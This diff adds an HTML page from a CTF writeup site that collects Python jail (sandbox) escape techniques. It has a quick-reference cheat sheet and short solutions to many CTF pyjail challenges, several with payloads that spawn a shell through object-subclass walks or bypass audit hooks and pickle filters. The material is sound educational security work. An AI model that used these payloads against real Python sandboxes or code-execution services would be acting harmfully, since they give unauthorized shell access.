@@ -1,0 +1,623 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/misc/pyjail.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>Pyjail - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="pyjail.html" class="nav-link active" aria-current="page">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="solution.html" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../puppeteer/index.html" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#python-jail-escape-techniques" class="nav-link">Python Jail Escape Techniques</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#quick-reference-cheatsheet" class="nav-link">Quick Reference Cheatsheet</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#hxp-39c3-ctf-sponsored" class="nav-link">hxp 39C3 CTF sponsored</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#tsg-ctf-2025-safepickle" class="nav-link">TSG CTF 2025 SafePickle</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#hkcert-ctf-2025-quals-easyjail" class="nav-link">HKCERT CTF 2025 Quals easyJail</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#seccon-ctf-2025-quals-excepython" class="nav-link">SECCON CTF 2025 Quals excepython</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#hacklu-ctf-2025-fangelse" class="nav-link">Hack.lu CTF 2025 FÄNGELSE</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#jailctf-2025-impossible" class="nav-link">jailCTF 2025 impossible</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#jailctf-2025-one" class="nav-link">jailCTF 2025 one</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#jailctf-2025-primal" class="nav-link">jailCTF 2025 primal</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#crewctf-2025-pyfuck" class="nav-link">CrewCTF 2025 pyfuck</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#crewctf-2025-bytecode-bonanza-basics" class="nav-link">CrewCTF 2025 Bytecode Bonanza - Basics</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#why2025-ctf-titlecase" class="nav-link">WHY2025 CTF TitleCase</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#fortid-ctf-2025-michael-scottfield" class="nav-link">FortID CTF 2025 Michael Scottfield</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#lactf-2025-farquaad" class="nav-link">LACTF 2025 farquaad</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#scriptctf-2025-modulo" class="nav-link">scriptCTF 2025 Modulo</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#uiuctf-2024-astea" class="nav-link">UIUCTF 2024 Astea</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#jailctf-2024-filterd" class="nav-link">jailCTF 2024 filterd</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#jailctf-2024-no-nonsense" class="nav-link">jailCTF 2024 no-nonsense</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#uoftctf-2024-jail-zero" class="nav-link">UofTCTF 2024 Jail Zero</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#seccon-ctf-2024-quals-1linepyjail" class="nav-link">SECCON CTF 2024 Quals 1linepyjail</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#imaginaryctf-2024-ok-nice" class="nav-link">ImaginaryCTF 2024 ok-nice</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#imaginaryctf-2024-calc" class="nav-link">ImaginaryCTF 2024 calc</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#ntua_h4ck-2024-snekbox" class="nav-link">NTUA_H4CK 2024 Snekbox</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#tbtl-ctf-2024-squeezing-tightly-on-arm" class="nav-link">TBTL CTF 2024 Squeezing Tightly On Arm</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#tcp1p-ctf-2024-typically-not-a-revenge" class="nav-link">TCP1P CTF 2024 typically not a revenge</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#tcp1p-ctf-2024-functional" class="nav-link">TCP1P CTF 2024 functional</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#tcp1p-ctf-2023-pymagic" class="nav-link">TCP1P CTF 2023 PyMagic</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#gdg-algiers-2022-type_it" class="nav-link">GDG Algiers 2022 Type_it</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#imaginaryctf-round-23-june-2022-stackless-jail" class="nav-link">ImaginaryCTF Round 23 June 2022 Stackless Jail</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="python-jail-escape-techniques">Python Jail Escape Techniques</h1>
+<p>This document provides a comprehensive collection of Python jail escape techniques from various CTF challenges. Python jails restrict execution by filtering characters, banning builtins, or limiting available operations.</p>
+<p><strong>References:</strong></p>
+<ul>
+<li><a href="https://shirajuki.js.org/blog/pyjail-cheatsheet/">Pyjail Cheatsheet</a></li>
+<li><a href="https://github.com/jailctf/pyjail-collection">Pyjail collection</a></li>
+<li><a href="https://github.com/salvatore-abello/pyjail/tree/main">A collection of pyjails</a></li>
+</ul>
+<h2 id="quick-reference-cheatsheet">Quick Reference Cheatsheet</h2>
+<h3 id="unicode-character-bypass">Unicode Character Bypass</h3>
+<p>Use Unicode characters that look like ASCII but bypass filters. See <a href="pyjail/unicode-bypass.html">details</a>.</p>
+<h3 id="variable-assignment-without">Variable Assignment Without <code>=</code></h3>
+<ul>
+<li><strong>In <code>exec</code> contexts:</strong> <code>a=1</code> (normal assignment)</li>
+<li><strong>In <code>eval</code> contexts:</strong> <code>[a:=1]</code> (walrus operator)</li>
+<li><strong>List comprehension:</strong> <code>[a for a in [1]]</code></li>
+<li><strong>Compact form with spaces:</strong> <code>[[a]for[a]in[[1]]]</code></li>
+</ul>
+<h3 id="function-calls-without-parentheses">Function Calls Without Parentheses</h3>
+<ul>
+<li><strong><code>__import__('os')</code> alternatives:</strong><ul>
+<li><code>help.__class__.__getitem__ = __import__;help['os']</code></li>
+<li><code>help.__class__.__contains__ = __import__('os').system;'sh' in help</code></li>
+<li><code>ExceptionGroup.__class_getitem__ = __import__; ExceptionGroup["os"]</code></li>
+<li><code>help.__class__.__getattr__ = __import__; help.os</code></li>
+</ul>
+</li>
+<li><strong><code>breakpoint()</code>:</strong> <code>license._Printer__setup = breakpoint; str(license)</code></li>
+<li><strong><code>exec(input())</code>:</strong> <code>@exec\n@input\nclass a: pass</code></li>
+</ul>
+<h3 id="string-construction-without-quotes">String Construction Without Quotes</h3>
+<ul>
+<li><strong>Character extraction:</strong> <code>help.__doc__[index]</code> (extract from existing strings)</li>
+</ul>
+<h3 id="accessing-builtins-when-banned">Accessing Builtins When Banned</h3>
+<ul>
+<li><code>().__class__.__base__.__subclasses__()</code></li>
+<li><code>().__class__.__mro__[1].__subclasses__()</code></li>
+<li><code>().__setattr__.__objclass__.__subclasses__()</code></li>
+</ul>
+<p>When <code>__import__</code> is available:</p>
+<ul>
+<li><code>().__reduce_ex__(2)[0].__builtins__</code></li>
+<li><code>().__reduce_ex__(2)[0].__globals__["__builtins__"]</code></li>
+</ul>
+<p>When you have access to exception:</p>
+<pre class="highlight"><code class="language-python">try:
+    1/0
+except Exception as e:
+    print(e.__traceback__.tb_frame.f_builtins)
+    print(e.__traceback__.tb_frame.f_globals["__builtins__"])</code></pre>
+<h3 id="numbers-and-booleans-without-digits">Numbers and Booleans Without Digits</h3>
+<ul>
+<li><strong><code>True</code>:</strong> Available directly</li>
+<li><strong><code>True</code> alternative:</strong> <code>[[]]&gt;[]</code></li>
+<li><strong><code>True</code> alternative:</strong> <code>not[]is[]</code></li>
+<li><strong><code>False</code>:</strong> <code>[]&gt;[]</code></li>
+<li><strong><code>False</code> alternative:</strong> <code>[]is[]</code></li>
+<li><strong>Increment:</strong> <code>-~x</code> equals <code>x + 1</code></li>
+</ul>
+<h3 id="obtaining-shell-access">Obtaining Shell Access</h3>
+<ul>
+<li><code>_aix_support._read_cmd_output(cmd)</code></li>
+<li><code>_osx_support._read_output(cmd)</code></li>
+<li><code>breakpoint()</code></li>
+<li><code>code.InteractiveConsole().interact()</code></li>
+<li><code>code.interact()</code></li>
+<li><code>doctest.debug_script(src)</code></li>
+<li><code>os.system("sh")</code></li>
+<li><code>pdb.run(src)</code></li>
+<li><code>pdb.set_trace()</code></li>
+<li><code>pydoc.pipe_pager(text, cmd)</code></li>
+<li><code>pydoc.tempfile_pager(text, cmd)</code></li>
+</ul>
+<h2 id="hxp-39c3-ctf-sponsored">hxp 39C3 CTF sponsored</h2>
+<p>Requirements:</p>
+<ol>
+<li>At most one occurrence for each character <code>.,(+)</code>: use function call + <code>__getattribute__</code> for <code>a.b</code>, call function step by step and save intermediate values via list comprehension</li>
+<li>No builtins: use <code>[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")</code></li>
+</ol>
+<p>Details <a href="pyjail/hxp-39c3-ctf-sponsored.html">here</a>.</p>
+<h2 id="tsg-ctf-2025-safepickle">TSG CTF 2025 SafePickle</h2>
+<p>Requirements:</p>
+<ol>
+<li>Pickle without <code>EXT1/EXT2/EXT4/REDUCE/INST/OBJ/PERSID/BINPERSID</code>: use <code>BUILD</code> for <code>license._Printer__setup = code.interact</code> and <code>print(license)</code> to run <code>code.interact</code></li>
+</ol>
+<p>Details <a href="../2025-12-20-tsg-ctf-2025/safe-pickle.html">here</a>.</p>
+<h2 id="hkcert-ctf-2025-quals-easyjail">HKCERT CTF 2025 Quals easyJail</h2>
+<p>Requirments:</p>
+<ol>
+<li>banned pickle <code>NEWOBJ_EX/INST/REDUCE/OBJ/NEWOBJ</code> opcodes: override <code>pickle._Unpickler.pop_mark</code> to <code>code.interact</code> and trigger <code>pop_mark()</code> via <code>TUPLE</code></li>
+</ol>
+<p>Details <a href="../2025-12-19-hkcert-ctf-2025-quals/easyJail.html">here</a>.</p>
+<h2 id="seccon-ctf-2025-quals-excepython">SECCON CTF 2025 Quals excepython</h2>
+<p>Requirements:</p>
+<ol>
+<li>At most one occurrence for each character <code>.,(+)</code>: use lambda + <code>__getattribute__</code> for <code>a.b</code>, call function step by step, save intermediate values in exception <code>KeyError</code> via <code>{}[obj]</code></li>
+<li>No builtins: use <code>[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")</code></li>
+</ol>
+<p>Details <a href="../2025-12-13-seccon-ctf-2025-quals/excepython.html">here</a>.</p>
+<h2 id="hacklu-ctf-2025-fangelse">Hack.lu CTF 2025 FÄNGELSE</h2>
+<p>Requirements:</p>
+<ol>
+<li>No more than 5 characters: use <code>exit(flagbuf)</code> to leak flag, use <code>a=exit;len=a</code> to override function in two steps, use <code>ⅺ</code> for <code>xi</code> to break the length limitation; alternatively, set <code>len=all</code> to bypass length check</li>
+</ol>
+<p>Details <a href="pyjail/hacklu-ctf-2025-fangelse.html">here</a>.</p>
+<h2 id="jailctf-2025-impossible">jailCTF 2025 impossible</h2>
+<p>Requirements:</p>
+<ol>
+<li>No parens: use <code>obj.__class__.__getitem__ = func</code> and <code>obj[arg]</code> to call function</li>
+<li>No spaces or equal signs: use <code>[[]for[a]in[[b]]]</code> instead of <code>a = b</code></li>
+<li>No strings: set <code>obj.__class__.__getattr__ = __import__</code> and <code>obj.os</code> to import <code>os</code></li>
+</ol>
+<p>Details <a href="pyjail/jailctf-2025-impossible.html">here</a>.</p>
+<h2 id="jailctf-2025-one">jailCTF 2025 one</h2>
+<p>Requirements:</p>
+<ol>
+<li>Only one <code>.</code>: use lambda function to reuse <code>value.__getattribute__</code> call</li>
+<li>No builtins: use <code>().__setattr__.__objclass__.__subclasses__()[os_index].__init__.__globals__['system']('sh')</code> to get shell</li>
+</ol>
+<p>Details <a href="pyjail/jailctf-2025-one.html">here</a>.</p>
+<h2 id="jailctf-2025-primal">jailCTF 2025 primal</h2>
+<p>Requirements:</p>
+<ol>
+<li>No <code>eta</code>: no getattr/setattr, use <code>obj[name]</code> to access fields</li>
+<li>No builtins: use <code>().__reduce_ex__(2)[0].__globals__['__builtins__']['__import__']('os')</code> to get os</li>
+<li>Words should have prime length: use <code>'aa'.__len__()</code> for <code>2</code>, use <code>\xXX</code> in strings</li>
+</ol>
+<p>Details <a href="pyjail/jailctf-2025-primal.html">here</a>.</p>
+<h2 id="crewctf-2025-pyfuck">CrewCTF 2025 pyfuck</h2>
+<p>Requirement:</p>
+<ol>
+<li>Only alphabetic characters, parentheses and plus sign: use plus sign to construct string, generator syntax and function call</li>
+<li>Limited builtins and count of <code>+</code>: search for a short combination to create the intended string</li>
+</ol>
+<p>Details <a href="pyjail/crewctf-2025-pyfuck.html">here</a>.</p>
+<h2 id="crewctf-2025-bytecode-bonanza-basics">CrewCTF 2025 Bytecode Bonanza - Basics</h2>
+<p>Requirements:</p>
+<ol>
+<li>Limit to the following opcodes in Python 3.9:<ol>
+<li>POP_TOP: pop top element</li>
+<li>DUP_TOP: duplicate top element</li>
+<li>UNARY_INVERT: invert top element</li>
+<li>BINARY_ADD: pop two elements, push the sum of them</li>
+<li>POP_JUMP_IF_TRUE: pop top element, jump to target if element is true (non-zero)</li>
+<li>EXTENDED_ARG: construct 16 bit argument for the next op</li>
+</ol>
+</li>
+<li>Implement three functions: <code>a-b</code>, <code>1337</code> and <code>a*b</code></li>
+</ol>
+<p>Details <a href="pyjail/crewctf-2025-bytecode-bonanza-basics.html">here</a>.</p>
+<h2 id="why2025-ctf-titlecase">WHY2025 CTF TitleCase</h2>
+<p>Use unicode bypass to avoid <code>str.title()</code>.</p>
+<p>Details <a href="../2025-08-08-why2025/misc/title-case.html">here</a>.</p>
+<h2 id="fortid-ctf-2025-michael-scottfield">FortID CTF 2025 Michael Scottfield</h2>
+<p>Requirements:</p>
+<ol>
+<li>Length &lt;= 500: Easy to achieve</li>
+<li>Allow <code>()</code> but no parameters: Use <code>pdb.set_trace()</code> or <code>code.InteractiveConsole().interact()</code></li>
+<li>No strings: Use docstrings and <code>str[index]</code> to create strings</li>
+<li>No numbers: Use <code>True</code> as 1</li>
+<li>No builtins: Use <code>().__class__.__base__.__subclasses__()</code></li>
+</ol>
+<p>Details <a href="../2025-09-12-fortid-ctf-2025/michael-scottfield.html">here</a>.</p>
+<h2 id="lactf-2025-farquaad">LACTF 2025 farquaad</h2>
+<p>Requirements:</p>
+<ol>
+<li>Only printable characters</li>
+<li>No <code>e</code> or <code>E</code>: Use <code>list(x.__dict__)[index]</code> to find strings with <code>e</code> in it and call it via <code>x.__dict__[list(x.__dict__)[index]](args)</code></li>
+<li>No builtins: Use <code>().__class__.__mro__[1].__subclasses__()</code></li>
+</ol>
+<p>Details <a href="pyjail/lactf-2025-farquaad.html">here</a>.</p>
+<h2 id="scriptctf-2025-modulo">scriptCTF 2025 Modulo</h2>
+<p>Requirements:</p>
+<ol>
+<li>No builtins: use <code>().__class__.__base__.__subclasses__()[os_wrap_index].__init__.__globals__["system"]("sh")</code></li>
+<li>No lowercase letters except <code>c</code>, only allow <code>%</code> binary op: use <code>"%c%c" % (97, 98)</code> to construct strings</li>
+<li>No integers: use <code>()&lt;((),)</code> as <code>1</code>, use <code>-~x</code> as <code>x+1</code></li>
+<li>No <code>.</code>: use <code>getattr(A, "B")</code> as <code>A.B</code></li>
+</ol>
+<p>Details <a href="../2025-08-16-scriptctf2025/modulo.html">here</a>.</p>
+<h2 id="uiuctf-2024-astea">UIUCTF 2024 Astea</h2>
+<p>Requirements:</p>
+<ol>
+<li>No function call: Use <code>f"{license}" for license._Printer__setup in [function_to_call]]</code> to call <code>function_to_call</code></li>
+<li>No builtins: Use <code>.__builtins__</code> of the given function to access builtins dict, or <code>.__globals__["__builtins__"]</code> of the given function to access builtins module</li>
+<li>No assignment: Use <code>[a:=b]</code> for assignment</li>
+</ol>
+<p>Details <a href="pyjail/uiuctf-2024-astea.html">here</a>.</p>
+<h2 id="jailctf-2024-filterd">jailCTF 2024 filterd</h2>
+<p>Requirement:</p>
+<ol>
+<li>Input length &lt;= 14: raise input length limit on the fly</li>
+<li>Blacklisted builtins: reuse existing function to re-evaluate</li>
+</ol>
+<p>Details <a href="pyjail/jailctf-2024-filterd.html">here</a>.</p>
+<h2 id="jailctf-2024-no-nonsense">jailCTF 2024 no-nonsense</h2>
+<p>Requirements:</p>
+<ol>
+<li>No <code>([=])</code>: call functions using decorators, <code>@exec\n@input\nclass a: pass</code></li>
+<li>AST name does not appear in input: use unicode bypass</li>
+<li>No newlines: use <code>\r</code> instead of <code>\n</code> for multiline code</li>
+</ol>
+<p>Details <a href="pyjail/jailctf-2024-no-nonsense.html">here</a>.</p>
+<h2 id="uoftctf-2024-jail-zero">UofTCTF 2024 Jail Zero</h2>
+<p>Requirements:</p>
+<ol>
+<li>No alphabetic: Use <a href="https://www.compart.com/en/unicode/block/U+1D400">Unicode Block “Mathematical Alphanumeric Symbols”</a> to bypass</li>
+<li>No numbers: Use <code>(''=='')</code> as 1</li>
+<li>No double underscores: Use <a href="https://unicode-explorer.com/c/FF3F">FULLWIDTH LOW LINE</a></li>
+<li>No builtins: Use <code>().__class__.__base__.__subclasses__()</code></li>
+</ol>
+<p>Details <a href="pyjail/uoftctf-2024-jail-zero.html">here</a>.</p>
+<h2 id="seccon-ctf-2024-quals-1linepyjail">SECCON CTF 2024 Quals 1linepyjail</h2>
+<p>Requirements:</p>
+<ol>
+<li>Length &lt;= 100: Try hard to reduce input length</li>
+<li>Allow <code>()</code> but no parameters: Use <code>sys.modules["pdb"].set_trace()</code></li>
+<li>No builtins: Use <code>().__class__.__base__.__subclasses__()</code> to find <code>sys</code></li>
+</ol>
+<p>Details <a href="pyjail/seccon-2024-quals-1linepyjail.html">here</a>.</p>
+<h2 id="imaginaryctf-2024-ok-nice">ImaginaryCTF 2024 ok-nice</h2>
+<p>Requirements:</p>
+<ol>
+<li>No numbers: Use <code>True</code> as 1</li>
+<li>Exception side channel: Use integer division by zero or array out of bounds to guess each character</li>
+<li><code>len(set(input)) &lt;= 17</code>: Reuse characters already appeared</li>
+</ol>
+<p>Details <a href="pyjail/imaginaryctf-2024-ok-nice.html">here</a>.</p>
+<h2 id="imaginaryctf-2024-calc">ImaginaryCTF 2024 calc</h2>
+<p>Requirements:</p>
+<ol>
+<li>Input is a expression: Use list comprehension to execute multiple statements</li>
+<li>Input should match regex: Use <code>1,</code> to bypass since it is not a full match</li>
+<li>Audit hook: Add signal handler, raise signal and change content of the audit hook to bypass</li>
+</ol>
+<p>Details <a href="pyjail/imaginaryctf-2024-calc.html">here</a>.</p>
+<h2 id="ntua_h4ck-2024-snekbox">NTUA_H4CK 2024 Snekbox</h2>
+<p>Requirements:</p>
+<ol>
+<li>No non-ascii characters</li>
+<li>Blacklisted dangerous functions: Use <code>globals()[function_name]</code> to bypass</li>
+</ol>
+<p>Details <a href="pyjail/ntua-h4ck-2024-snekbox.html">here</a>.</p>
+<h2 id="tbtl-ctf-2024-squeezing-tightly-on-arm">TBTL CTF 2024 Squeezing Tightly On Arm</h2>
+<p>Requirements:</p>
+<ol>
+<li>No <code>'</code>: Use <code>"</code> for strings</li>
+<li>Some characters may appear only once: save intermediate values to locals</li>
+<li>No builtins: Use <code>().__class__.__base__.__subclasses__()</code> to bypass</li>
+</ol>
+<p>Details <a href="pyjail/tbtl-ctf-2024-squeezing-tightly-on-arm.html">here</a>.</p>
+<h2 id="tcp1p-ctf-2024-typically-not-a-revenge">TCP1P CTF 2024 typically not a revenge</h2>
+<p>Requirements:</p>
+<ol>
+<li>No numbers: Use <code>arr[[]is[]]</code> for <code>arr[0]</code>, <code>arr[not[]is[]]</code> for <code>arr[1]</code>, <code>arr[not[]is[]:][not[]is[]]</code> for <code>arr[2]</code></li>
+<li>No parens: Use <code>[class[arg] for class.__class_getitem__ in [function_to_call]]</code> to call function</li>
+<li>No assignments or commas: Use <code>[... for a in [b] for c in [d]]</code></li>
+<li>No spaces: Use <code>\f</code> i.e. form feed</li>
+<li>No builtins: Use <code>[].__class__.__base__.__subclasses__()</code></li>
+<li>No sys module: Use <code>&lt;class 'os._wrap_close'&gt;</code> to find system</li>
+</ol>
+<p>Details <a href="pyjail/tcp1p-ctf-2024-typically-not-a-revenge.html">here</a>.</p>
+<h2 id="tcp1p-ctf-2024-functional">TCP1P CTF 2024 functional</h2>
+<p>Requirements:</p>
+<ol>
+<li>Call functions with zero argument, or return value of another function, and all function names should match <code>[ad-z]+</code></li>
+</ol>
+<p>Details <a href="pyjail/tcp1p-ctf-2024-functional.html">here</a>.</p>
+<h2 id="tcp1p-ctf-2023-pymagic">TCP1P CTF 2023 PyMagic</h2>
+<p>Requirements:</p>
+<ol>
+<li>No <code>()</code>: Use <code>class.__class_getitem__</code> and <code>class[]</code> to bypass</li>
+<li>No strings: Use docstrings and <code>str[index]</code> to create strings</li>
+<li>No numbers: Use <code>True</code> as 1</li>
+<li>No spaces: Use <code>\r</code> to bypass while making <code>input()</code> happy</li>
+<li>No builtins: Use <code>().__class__.__base__.__subclasses__()</code></li>
+</ol>
+<p>Details <a href="pyjail/tcp1p-ctf-2023-pymagic.html">here</a>.</p>
+<h2 id="gdg-algiers-2022-type_it">GDG Algiers 2022 Type_it</h2>
+<p>Requirements:</p>
+<ol>
+<li>No non-ascii characters</li>
+<li>No blacklisted characters</li>
+<li>Prone to string injection</li>
+</ol>
+<p>Details <a href="pyjail/gdg-algiers-2022-type-it.html">here</a>.</p>
+<h2 id="imaginaryctf-round-23-june-2022-stackless-jail">ImaginaryCTF Round 23 June 2022 Stackless Jail</h2>
+<p>Requirements:</p>
+<ol>
+<li>Function can only use at most one stack element: use <code>CALL_FUNCTION</code> instead of <code>CALL_METHOD</code>, i.e. use <code>B = A.method; C = B()</code> instead of <code>A.method()</code></li>
+</ol>
+<p>Details <a href="pyjail/imaginaryctf-round-23-stackless-jail.html">here</a>.</p></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
